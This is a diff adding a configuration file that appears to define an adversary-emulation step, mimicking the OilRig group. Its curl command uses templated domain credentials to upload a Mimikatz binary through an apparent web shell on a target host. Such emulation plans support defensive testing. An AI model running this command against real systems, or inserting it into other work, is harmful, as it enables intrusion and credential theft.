@@ -1,0 +1,33 @@
+ability_id: f96e8195-8b0f-4b87-bdce-748dfda2861f
+access: {}
+additional_info: {}
+buckets:
+- command-and-control
+delete_payload: true
+description: Download Mimikatz
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}'
+    -k -X POST -F "upl=f1" -F 'sav=C:\Windows\temp\' -F "vir=false" -F "nen=m64.exe"
+    -F 'f1=@m64.exe' https://#{second.target.ip}/EWS/contact.aspx
+  language: null
+  name: sh
+  parsers: []
+  payloads:
+  - m64.exe
+  platform: linux
+  timeout: 60
+  uploads: []
+  variations: []
+name: OilRig Download Mimikatz (Kali Agent)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: command-and-control
+technique_id: T1105
+technique_name: Ingress Tool Transfer
